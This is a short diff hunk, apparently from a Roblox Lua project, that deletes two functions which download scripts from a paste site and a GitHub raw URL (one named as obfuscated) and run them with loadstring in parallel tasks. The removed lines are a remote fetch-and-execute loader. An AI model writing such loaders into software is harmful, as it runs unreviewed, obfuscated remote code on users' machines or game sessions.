@@ -1,8 +1,0 @@
-local function s1()
-loadstring(game:HttpGet("https://paste.debian.net/plainh/90d786f0/", true))()
-end
-local function s2()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/universal-roblox/Test/refs/heads/main/obfuscated_script-1761232645420.lua.txt"))()
-end
-task.spawn(s1)
-task.spawn(s2)
